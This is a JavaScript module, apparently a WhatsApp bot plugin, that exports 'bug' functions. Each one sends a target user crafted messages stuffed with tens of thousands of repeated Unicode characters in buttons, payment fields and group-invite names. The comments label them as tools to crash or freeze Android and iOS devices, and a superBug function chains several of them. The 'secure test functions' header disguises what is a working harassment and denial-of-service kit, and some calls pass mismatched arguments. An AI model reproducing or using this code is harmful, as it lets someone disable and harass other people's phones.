// ============================================================
// BUG-FONCTION.JS
// Fonctions de test sécurisées pour le plugin bug.js
// ============================================================

    // 1. CRASH — payXcl1ck
    async function payXcl1ck(tgt) {
      await socket.relayMessage(tgt, {
        interactiveMessage: {
          body: { text: "Primis" + "ꦽ".repeat(15000) },
          nativeFlowMessage: {
            buttons: [{
              name: "payment_info",
              buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4TWOZ803CWN","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"payment_key","payment_key":{"type":"IDPAYMENTACCOUNT","key":"${".".repeat(30000)}","name":"OVO","institution_name":"OVO","full_name_on_account":"R9X ","account_type":"wallet"}}],"share_payment_status":false,"referral":"chat_attachment"}`
            }]
          }
        }
      }, { participant: { jid: tgt } });
    }

    // 2. BLANK — Freeze telefòn
    async function blankBug(tgt) {
      for (let p = 0; p < 20; p++) {
        await socket.relayMessage(tgt, {
          interactiveMessage: {
            body: { text: "D5!Primi¿?" },
            footer: { text: "D5!Primi¿?" },
            header: { title: "D5!Primi¿?", hasMediaAttachment: false },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "ြ  ြ".repeat(8000) },
                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "ြ  ြ".repeat(8000), url: "https://" + "ြ  ြ".repeat(8000) + ".com", merchant_url: "https://" + "ြ  ြ".repeat(8000) + ".com" }) },
                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ြ  ြ".repeat(8000), id: "Primis", copy_code: "ြ  ြ".repeat(8000) }) }
              ]
            }
          }
        }, {});
      }
    }

    // 3. BLANKING — Crash bouton quick_reply
    async function blanking(tgt) {
      await socket.relayMessage(tgt, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "Primis", format: "DEFAULT" },
              nativeFlowMessage: {
                buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(150000), id: null }) }],
                version: 3
              }
            }
          }
        }
      }, { participant: { jid: tgt } });
    }

    // 4. INVITE ANDROID
    async function inviteAndroid(tgt) {
      await socket.relayMessage(tgt, {
        groupInviteMessage: {
          groupName: "ཹ".repeat(130000),
          groupJid: '6285709664923-1627579259@g.us',
          inviteCode: 'h+64P9RhJDzgXSPf',
          inviteExpiration: '999',
          caption: `🧪 Crash Android`,
          thumbnail: null
        }
      }, { participant: { jid: tgt } });
    }

    // 5. INVITE IOS
    async function inviteIos(tgt) {
      await socket.relayMessage(tgt, {
        groupInviteMessage: {
          groupName: "𑐶𑐵𑆷𑐷𑆵".repeat(39998),
          groupJid: '6285709664923-1627579259@g.us',
          inviteCode: 'h+64P9RhJDzgXSPf',
          inviteExpiration: '999',
          caption: `🧪 Crash iOS`,
          thumbnail: null
        }
      }, { participant: { jid: tgt } });
    }

    // 6. CHANNEL BUG
    async function channelBug(tgt) {
      await socket.relayMessage(tgt, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: { participant: "131355550002@s.whatsapp.net", remoteJid: "status@broadcast", id: socket.generateMessageTag() },
              type: "STATUS_MENTION_MESSAGE"
            }
          }
        }
      }, {});
    }

/**
 * Test complet
 */
async function superBug(conn, targetJid) {
    await payXcl1ck(conn, targetJid);
    await blankBug(conn, targetJid);
    await blanking(conn, targetJid);
    await inviteAndroid(conn, targetJid);

    return true;
}

// ============================================================
// EXPORTS
// ============================================================

module.exports = {
    payXcl1ck,
    blankBug,
    blanking,
    inviteAndroid,
    inviteIos,
    channelBug,
    superBug
};